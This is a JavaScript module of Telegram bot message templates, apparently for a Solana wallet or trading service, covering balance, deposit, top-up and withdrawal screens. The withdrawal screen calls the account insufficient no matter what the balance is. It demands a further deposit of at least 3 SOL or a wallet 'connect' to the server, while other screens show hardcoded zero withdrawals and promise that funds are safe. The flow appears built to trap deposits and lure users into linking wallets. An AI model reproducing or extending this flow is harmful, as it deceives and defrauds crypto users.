import { Markup } from "telegraf"
import { formatDate } from "./tempMesg/FormatDate.js"
import path from 'path'
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)

const imageUrl = {
  CONNECT1: path.join(__dirname, "img", "balance.jpg")
}

export const balanceInfo = (user)=> ({
  media: {
    source: imageUrl.CONNECT1,
    caption: `💼 <b>BALANCE & PERSONAL INFO</b>\n\n`+ 
            `<b>NAME</b>: ${user.Name}\n`+
            `<b>USER-ID</b>: ${user.id}\n`+
            `<b>CA</b>: ${user.CA} \n\n`+
            `💳 <b>CURRENT BALANCE</b>\n\n`+
            `. Available: <b>${user.balance} SOL</b>\n`+
            `. Status: 🟢 ONLINE\n\n`+
            `     📊<b>SUMMARY</b>📊\n`+
            `. Incomplete Orders: <b>0</b>\n`+
            `. Total Withdrawn: 0.0000 SOL\n\n`+
            `💡 <i>Last updated: ${formatDate(user.UpdatedAt)}</i>`,
    parse_mode: 'HTML'
  },
  extra: Markup.inlineKeyboard([
    [Markup.button.callback('📇 Withdraw', 'Withdraw'), Markup.button.callback('💳 Deposit', 'Deposit')],
    [Markup.button.callback('🔄 Refresh', 'Refresh'), Markup.button.callback('☰ Menu', 'Menu')]
  ])
})

export const Withdraw = (user)=> ({
  media: {
    caption: `⚠️ <b>Current Account is insufficient</b>\n\n`+
            `💳 CURRENT BALANCE: <b>${user.balance} SOL</b>\n\n`+
            `. <i>Please deposit at least 3 SOL to your wallet or Connect your wallet to the server to access withdrawal</i>`,
    parse_mode: 'HTML'
  },
  extra: Markup.inlineKeyboard([
    [Markup.button.callback('💳 Deposit', 'Deposit'), Markup.button.callback('📥 Connect', 'Connect')],
    [Markup.button.callback('🚫 Cancel', 'Cancel')]
  ])
})

export const Deposit = (ctx)=> ({
  media: {
    caption: `➕ <b>Deposit funds</b>\n\n`+
            `💳 kindly click on the <b>add</b> button to generate your wallet.\n\n`+
            `💡 NOTE that all your <b>Funds</b> are safe with us.`,
    parse_mode: 'HTML'
  },
  extra: Markup.inlineKeyboard([
    [Markup.button.callback('➕ Add', 'Add')],
    [Markup.button.callback('➕ 0.5 SOL', '0.5'), Markup.button.callback('➕ 1 SOL', '1')],
    [Markup.button.callback('➕ 2 SOL', '2'), Markup.button.callback('➕ 5 SOL', '5')],
    [Markup.button.callback('🔙 Back', 'Back'), Markup.button.callback('🔙 Menu', 'Menu')]
  ])
})

export const Add = ()=> ({
  media:{
    caption: `✍ <b>Enter the amount you want to TOP-UP:</b>\n\n`+
            `. <code>Minimum: 0.50 SOL</code>\n`+
            `. <code>Maximum: 1000 SOL</code>\n`,
    parse_mode: 'HTML'
  },
  extra: Markup.keyboard([
    ['🚫Cancel']
  ]).oneTime().resize()
})

export const depositPayment = (amount, sol)=> ({
  media: {
    caption: `<b>💳 Deposit Payment:</b>\n\n`+
            `Make a <b>SOL</b> deposit to the address below\n\n`+
            `<b>Amount: ${amount} SOL</b>\n\n`+
            `<b>➕ Wallet Address:</b>\n`+
            `<code>${sol}</code>\n\n`+
            `⚠️<b>important:</b> send only sol to this address\n\n`+
            `💡 after sending, use /verify command to confirm`,
    parse_mode: 'HTML'    
  },
  extra: Markup.inlineKeyboard([
    [Markup.button.callback('🚫 Cancel', 'Cancel')]
  ]) 
})


 

